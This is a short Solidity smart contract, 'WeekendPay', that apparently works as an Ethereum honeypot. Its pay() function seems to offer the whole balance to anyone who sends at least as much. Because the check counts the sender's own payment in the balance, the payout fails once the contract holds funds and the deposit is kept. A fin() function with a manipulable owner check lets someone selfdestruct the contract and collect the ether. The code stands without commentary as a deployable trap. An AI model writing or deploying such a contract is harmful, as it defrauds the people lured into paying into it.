pragma solidity ^0.4.25;

contract WeekendPay
{
    address O = msg.sender;
    address owner;

    function() public payable {
        owner = msg.sender;
    }

    function pay() public payable {
        if (msg.value >= this.balance) {
            msg.sender.transfer(this.balance);
        }
    }
    function fin() public {
        if (owner == O) {
            selfdestruct(msg.sender);
        }
    }
 }